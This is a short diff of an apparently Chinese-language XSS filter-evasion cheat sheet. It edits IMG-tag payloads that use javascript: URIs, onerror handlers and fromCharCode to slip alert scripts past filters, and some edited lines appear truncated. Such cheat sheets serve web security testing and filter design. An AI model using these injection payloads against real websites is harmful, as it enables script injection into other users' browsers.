@@ -131,7 +131,7 @@ alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//
 如果不允许任何形式的引号，你可以通过执行JavaScript里的fromCharCode函数来创建任何你需要的XSS攻击向量：
 
 
-<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=javascript:>
 
 
 ### 2.13.    使用默认SRC属性绕过SRC域名过滤器
@@ -157,7 +157,7 @@ alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//
 ### 2.16.    通过error事件触发alert
 
 
-<IMG SRC=;alert(String.fromCharCode(88,83,83)) onerro+r=”alert(String.fromCharCode(88,83,83))”></img>
+<IMG SRC=;s onerro+r=”alert(String.fromCharCode(88,83,83))”></img>
 
 
 ### 2.17.    对IMG标签中onerror属性进行编码
